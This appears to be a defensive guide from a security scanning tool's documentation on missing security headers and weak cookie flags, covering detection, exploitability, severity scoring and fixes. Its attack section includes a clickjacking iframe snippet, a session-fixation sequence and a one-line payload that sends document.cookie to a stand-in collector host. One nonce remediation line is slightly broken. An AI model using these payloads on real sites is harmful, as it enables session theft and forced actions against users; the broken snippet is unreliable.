# Security Headers and Cookie Flags (CWE-693, CWE-1021, CWE-614, CWE-1004)

## What it is

A response header is a set of instructions the server hands the browser about
what the delivered document may do, and `Set-Cookie` attributes decide which
credential the browser may attach to later requests. A missing or weakened
value is not a missing feature, it is a missing enforcement point: the boundary
crossed is between an attacker-supplied origin (another site, a framing
document, a network observer, a sibling subdomain) and the browser's default
behaviour, which is to allow the action. TriageKit reports this class three
ways: the Website Security Adviser (`triagekit webscan <url> --json`) emits
categories `headers`, `cors` and `cookies`; the repo scan (`triagekit scan
<path> --json`) emits `cors-wildcard`, `cors-wildcard-header` and
`jwt-verify-off`; and the Python taint analyzer follows request data into
cookie and header writes.

## Detection

### From the wire (`triagekit webscan <url> --json`)

Missing-header findings come from one catalog (`SECURITY_HEADERS` in
`src/triagekit/core/analyzers/web_scan.py`), raised only for the root URL's
response, so check the recorded response entry, not the summary line:

| Header | What it actually prevents | CWE / severity |
| --- | --- | --- |
| `Strict-Transport-Security` | the browser speaking plain HTTP to this host for `max-age` seconds | CWE-319 / high |
| `Content-Security-Policy` | which sources may execute, load, frame or submit in this document | CWE-1021 / high |
| `X-Frame-Options` | legacy clickjacking control, superseded by CSP `frame-ancestors` | CWE-1021 / medium |
| `X-Content-Type-Options: nosniff` | the browser guessing a content type, so markup is not parsed as HTML | CWE-693 / medium |
| `Referrer-Policy` | what this page tells the next site about itself (paths, tokens) | CWE-200 / low |
| `Permissions-Policy` | which powerful APIs (camera, geolocation, usb) the document may call | CWE-250 / low |

`X-XSS-Protection` is deliberately skipped by the analyzer, and
`Content-Security-Policy-Report-Only` is a different header name that therefore
also triggers "missing CSP". Two exact checks to reuse rather than approximate:

```text
# weak CSP: substring check on the value -> medium / CWE-79
if "unsafe-inline" in csp or "unsafe-eval" in csp:
# cookies: "sess|auth|token|jwt|sid" in the NAME bumps "missing HttpOnly"/"missing Secure" to high
```

### CSP directives, one line each on what they prevent

- `default-src` - fallback for every fetch directive; nothing else.
- `script-src` - which scripts execute. `'unsafe-inline'` re-allows inline
  `<script>` and `on*=` handlers; `'unsafe-eval'` re-allows `eval`, `new
  Function` and `setTimeout("string")`; `'strict-dynamic'` lets already-trusted
  scripts load further scripts.
- `object-src 'none'` blocks plugin content; `base-uri 'self'` stops a `<base
  href>` injection re-pointing every relative script URL on the page.
- `form-action` - where forms may submit. `frame-ancestors` - who may frame this
  document, and **`frame-ancestors` is the real clickjacking control;
  `X-Frame-Options` is the legacy one, honoured only when no `frame-ancestors`
  is present.**
- `upgrade-insecure-requests` upgrades `http://` subresources,
  `require-trusted-types-for 'script'` locks DOM XSS sinks, `report-to` sends
  violations (evidence, not a fix).
`'unsafe-inline'` and `'unsafe-eval'` gut the policy because they hand execution
back to markup: any reflected value then runs, and every inline handler or `eval`
on the page is legal again. The nuance a substring check cannot see: per CSP3, if
the directive also contains a **nonce or a hash source**, `'unsafe-inline'` is
ignored for that directive, so `script-src 'nonce-r4nd0m' 'unsafe-inline'` is not
gutted. Nonce and hash forms are the fix; `report-only` is the deployment gate:

```text
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'nonce-r4nd'
# blocks nothing; measure with it, then switch to the non "-Report-Only" name
```

### Cookie parsing, done correctly

Parse attributes, never substrings. A `Set-Cookie` line is
`name=value; Attr; Attr=Value` with case-insensitive attribute names:

```text
Set-Cookie: sid=8f14e; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

Substring matching produces false flags: `"Secure" in header` also matches a
cookie named `secure-pref` or a `Path=/secure` string, and `"samesite" in
header` also matches a cookie *value* that happens to contain it. Split on `;`
and compare attribute names. Also:

- `SameSite=None` without `Secure` is rejected by modern browsers, so "the
  attribute is present" is not the same as "the attribute works".
- `__Host-` prefixes require `Secure`, `Path=/` and **no `Domain`**; miss any
  one and the browser does not apply the prefix guarantees. `Domain=.example.com`
  is scoped to the whole zone, so a sibling subdomain can overwrite it.
- TriageKit merges repeated cookie names across responses (strongest
  `secure`/`httponly` wins, first non-empty `samesite` wins), so a finding on a
  merged cookie can be a merge artifact: check the per-response
  `set_cookie_count` first. The scanner does not parse `Domain`, `Expires`,
  `Partitioned` or prefixes; those checks are yours to make by hand.

### From code (`triagekit scan <path> --json`)

```js
// Express: cookie set without the flags that matter
res.cookie("sid", sid, { maxAge: 3600000 });           // no httpOnly/secure/sameSite
res.setHeader("Set-Cookie", "sid=" + sid);             // raw header, attributes lost
document.cookie = "sid=" + token;                      // JS writes the session cookie
app.use(cors({ origin: "*", credentials: true }));     // rule: cors-wildcard
app.use(cors({ origin: true, credentials: true }));    // NOT matched: reflects any Origin
```

```python
# Flask / Django: flags turned off, or set to a value that breaks
SESSION_COOKIE_HTTPONLY = False       # then any XSS reads the session id
SESSION_COOKIE_SAMESITE = "None"      # without SECURE, browsers reject it
SECURE_HSTS_SECONDS = 0               # header emitted, but max-age=0 disables it
```

Reverse proxy shapes to read by hand: `add_header Content-Security-Policy
"default-src 'self'; script-src 'unsafe-inline'"` and `add_header
Strict-Transport-Security "max-age=0"` (a header emitted with `max-age=0`
disables HSTS rather than enabling it), and note that an `add_header` inside a
`location` block is **not** inherited from `server` level.

The `cors-wildcard` regex is `cors\s*\(\s*\{[^}]*origin\s*:\s*['\"]?\*['\"]?`;
it does not match `origin: true`, `origin: /\.example\.com$/` or a reflected
origin computed per request. Those are the dangerous ones; read the handler
(`skills/20-api-and-graphql.md` has the CORS analysis).

## How it works (attack mechanics)

Clickjacking, when neither `frame-ancestors` nor `X-Frame-Options` is set:

```html
<style>iframe{position:absolute;top:-120px;left:-40px;opacity:0;height:600px}</style>
<iframe src="https://fixture.example/account/confirm"></iframe>
<button style="position:absolute;top:140px;left:60px">Take the survey</button>
```

The victim clicks the visible button; the click lands on the invisible button in
the framed document, which carries the victim's cookie. `frame-ancestors 'none'`
(or `'self'`) removes the framing, not the button.

CSP gutted by `'unsafe-inline'`: an inline handler with no nonce executes
anything the page reflects, and the missing `HttpOnly` turns that into a
one-line session theft -- the payload only has to run once:

```js
fetch("https://collector.example/c?c=" + document.cookie);
```

Session fixation is a cookie-semantics bug, not a header bug: the server accepts
a session identifier the client already had before authenticating.

```text
Set-Cookie: sid=PRELOGIN_ID          # victim's browser, set by the attacker page
POST /login  (victim's credentials)  # server keeps sid=PRELOGIN_ID, marks it auth
# attacker replays sid=PRELOGIN_ID and is now the victim
```

The fix is rotation, not secrecy: a new identifier on every authentication.
Related, and prevented only by the `__Host-` prefix, is cookie tossing from a
sibling subdomain -- `Set-Cookie: sid=ATTACKER_CHOSEN; Domain=.example.com;
Path=/; Secure`. An attacker who can set a cookie for the parent zone can
fixate it, force a logout, or overwrite a CSRF token, because
`Domain=.example.com` reaches every hostname under it.

HSTS (`max-age`, `includeSubDomains`, `preload`) does nothing on a plain-HTTP
first visit: the browser has no cached policy, the request goes out in the
clear, and by specification the header in that response is ignored. What HSTS
stops is the *second* visit and subresource downgrades, not first contact.

## Is it actually exploitable? (exploitability test)

1. **Is the header on the response that matters?** The scanner checks the root
   URL only; a policy on `/`, a `301` to `https://`, and a `/health` endpoint
   that sets nothing are three different things.
2. **Is it enforced or only reported?** `Content-Security-Policy-Report-Only`
   is a separate header name and blocks nothing.
3. **Does the application render HTML, and does it use cookies?** On a pure JSON
   API with no cookies, `X-Frame-Options` and `HttpOnly` are noise; say so and
   drop them. On an HTML app with a session cookie, they are the finding.
4. **Is the site on HTTPS at all?** HSTS on a host with no TLS listener, or on a
   fixture served over `http://localhost`, is not exploitable, and TriageKit does
   not emit "missing Secure" when the response URL is not `https`.
5. **Does the CSP still allow the behaviour you claim?** `'unsafe-inline'` is
   inert next to a nonce; `'unsafe-eval'` only matters if the page calls `eval`;
   `frame-ancestors 'self'` still allows same-origin framing. Name the directive
   that covers the exact behaviour, not the keyword.
6. **Is there a second control that already covers it?** A per-request CSRF token
   covers the CSRF half of a missing `SameSite`; a nonce-based CSP covers the XSS
   a missing `HttpOnly` would have amplified. Downgrade, do not delete, and say
   which control you found.

## False positives (do NOT report)

- A CSP with `'unsafe-inline'` in the same directive as a `'nonce-...'` or hash
  source. The browser ignores the keyword.
- `Content-Security-Policy-Report-Only` reported as "no CSP". Report it as
  "policy not enforced" and name the header exactly; the developer's fix differs.
- The keyword `unsafe-inline` matching inside a longer token, for example the
  hostname `https://unsafe-inline.example.com` in `script-src`. Parse the source
  expressions.
- `X-Frame-Options` missing when CSP `frame-ancestors` is present and correct, and
  `X-XSS-Protection` in any form. TriageKit skips the latter on purpose; adding it
  back is noise. Report the CSP state once.
- Missing `Secure` on a cookie set over a plain-HTTP fixture or `localhost` dev
  server (the analyzer requires an https response URL, so do not report it
  manually without a TLS endpoint).
- Missing `HttpOnly` on a cookie no JavaScript needs to read and no script
  reads, for a purely server-side preference cookie (`theme`, `locale`,
  `cart id`). Keep the finding for names matching `sess|auth|token|jwt|sid`.
- Missing `SameSite` as a full CSRF finding. Modern browsers default to `Lax`,
  which already blocks cross-site `POST`; report the hardening gap unless the
  target browser matrix includes pre-2020 behaviour or the state-changing
  endpoint is a `GET`. `SameSite=None; Secure` on a cookie used only for a
  cross-site login callback is correct for that job.
- Missing `Cross-Origin-Embedder-Policy` reported as high. It only matters for
  cross-origin isolation (`SharedArrayBuffer`, high-resolution timers), and
  enforcing `require-corp` without auditing every cross-origin subresource
  breaks third-party images and scripts. Report as informational with the
  requirement named. `Cross-Origin-Resource-Policy` only matters on resources
  that must be readable cross-origin, or under COEP.
- Missing `Cross-Origin-Opener-Policy` on an app with no `postMessage`
  relationship to other origins. `same-origin` also breaks legitimate OAuth
  popup flows; note the popup requirement when you recommend it
  (`same-origin-allow-popups` is the compromise).
- A session id that is already rotated at login. Not fixation, however the id is
  transported.

## Severity

CVSS v4.0, no numeric score. Representative vectors:

- Session cookie without `HttpOnly`, with a DOM XSS sink on the same page:
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- CSP with `'unsafe-inline'` and no nonce, on a page that reflects a request
  parameter into HTML (paired with `skills/10-xss.md`):
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`
- No `frame-ancestors` and no `X-Frame-Options` (clickjacking: one click, no
  confidentiality loss, integrity only):
  `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- Missing `SameSite` with a state-changing `POST` and no CSRF token:
  `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- Missing HSTS (needs a network position and a first plain-HTTP visit):
  `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N`
- Referrer-Policy set to `unsafe-url` with a reset token in the query string:
  `CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:L/SI:N/SA:N`

Metrics that move: `VC`/`VI` to `H` when the cookie lacks `HttpOnly` and the page
has any script sink; `VI:H` with `VC:N` for clickjacking and CSRF, where nothing
is read but an action is performed as the victim; `UI:A` for anything needing a
click, `UI:P` for anything rendered automatically; `PR:N` only when no
authentication is required to reach the request, otherwise `PR:L`; `AC:H` for
HSTS and network-position attacks, `AT:P` where the attack needs a specific
first-visit posture. Always emit the vector and the calculator link:
`https://www.first.org/cvss/calculator/v4.0#CVSS:4.0/<vector>`.

## Remediation

Express with Helmet, before and after -- and note there is no `'unsafe-inline'`
and no `'unsafe-eval'` in any directive:

```js
// before
const app = express();
app.use(cors({ origin: true, credentials: true }));
// after
const helmet = require("helmet");
app.use(helmet());
app.use(helmet.contentSecurityPolicy({ directives: {
    defaultSrc: ["'self'"], scriptSrc: ["'self'"], objectSrc: ["'none'"],
    baseUri: ["'self'"], formAction: ["'self'"], frameAncestors: ["'none'"] }}));
```

For an inline block that must survive, issue a per-response nonce and reference
it, which by spec also makes `'unsafe-inline'` inert in that policy:

```js
app.use((req, res, next) => { res.locals.nonce = crypto.randomBytes(16).toString("base64"); next(); });
// <script nonce="<%= nonce %>">...</script>  scriptSrc: ["'self'", "'nonce-"+req.locals.nonce]
```

HSTS, `Referrer-Policy`, `Permissions-Policy` and the COOP/COEP/CORP group:

```text
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Referrer-Policy: strict-origin-when-cross-origin   # or no-referrer
Permissions-Policy: camera=(), microphone=(), geolocation=()
Cross-Origin-Opener-Policy: same-origin             # same-origin-allow-popups if OAuth popups
Cross-Origin-Embedder-Policy: require-corp          # only after auditing cross-origin assets
Cross-Origin-Resource-Policy: same-site             # on resources that need the restriction
```

Two cautions that belong next to those values in the report: `includeSubDomains`
covers hostnames that do not serve TLS, making them unreachable in a conforming
browser, so recommend it only after enumerating subdomains; and `preload` is a
one-way door once submitted.

Express cookie flags and session rotation, the actual fixation fix:

```js
// before -- no flags, and the session id survives login unchanged
res.cookie("sid", sid, { maxAge: 3600000 });
// after -- HttpOnly + Secure + SameSite, __Host- pins scope to this host
res.cookie("__Host-sid", sid, {
  httpOnly: true, secure: true,
  sameSite: "lax",      // "strict" if no top-level cross-site navigation
  path: "/",            // required for __Host-; no domain property
  maxAge: 3600000,
});
// rotate the identifier on authentication, then set the identity
app.post("/login", async (req, res) => {
  const user = await check(req.body.email, req.body.password);
  req.session.regenerate(() => { req.session.userId = user.id; res.redirect("/"); });
});
```

Flask and Django, before and after:

```python
# Flask before: app.config.update(SESSION_COOKIE_HTTPONLY=False); set_cookie("sid", sid)
app.config.update(SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SECURE=True,
                  SESSION_COOKIE_SAMESITE="Lax",
                  PERMANENT_SESSION_LIFETIME=timedelta(hours=1))
@app.after_request
def harden(resp):
    resp.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    resp.headers["Content-Security-Policy"] = "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return resp

# Django: the defaults are unsafe, set them explicitly
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = "Lax"
CSRF_COOKIE_SECURE = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True      # only if every subdomain serves TLS
SECURE_REFERRER_POLICY = "strict-origin-when-cross-origin"
X_FRAME_OPTIONS = "DENY"                   # or CSP frame-ancestors 'none'
```

Session rotation, one line each in the other stacks: Django's
`request.session.cycle_key()` issues a new key and keeps the data; PHP's
`session_regenerate_id(true)` deletes the old session file, where `false` leaves
the fixation hole open.

## Verify the fix

1. Headers, one request, exact values:

```bash
curl -sI https://fixture.example/ | grep -iE 'strict-transport-security|content-security-policy|x-content-type|referrer-policy'
```

   Assert `max-age=31536000`, `includeSubDomains`, `preload`; assert the CSP
   contains `default-src 'self'` and `object-src 'none'` and does **not** contain
   `unsafe-inline` unless the same directive carries `'nonce-`.

2. Cookie attributes, parsed rather than substring-matched. `SimpleCookie`
   stores attributes case-insensitively and puts non-attributes in `ck.keys()`,
   so a cookie named `Secure` cannot masquerade as a flag:

```python
from http.cookies import SimpleCookie
ck = SimpleCookie(resp.headers["set-cookie"])["sid"]
assert ck["secure"] and ck["httponly"] and ck["samesite"].lower() == "lax"
assert "domain" not in {k.lower() for k in ck.keys()}
```

3. Framing check in a browser: frame the fixture with the opacity/offset trick
   above and confirm the framing refusal and that no request to the
   state-changing endpoint is issued.
4. Rotation check, the session-fixation test:

```python
def test_session_id_rotates_on_login(client):
    before = client.get("/").cookies["sid"]
    client.post("/login", json={"email": "a@x.test", "password": "pw"})
    assert client.cookies["sid"] != before
```

5. Re-run the scanners and confirm the categories are clean:

```bash
triagekit scan <path> --json | rg -i 'cors-wildcard|cors-wildcard-header'
triagekit webscan https://fixture.example --json | rg -i 'category": "(headers|cookies)'
```

   Both should return nothing. Leave the `verify_fix` note open until they do;
   see `skills/08-progress-and-ci.md` for the re-scan gate and
   `skills/27-false-positive-control.md` before closing anything by hand.
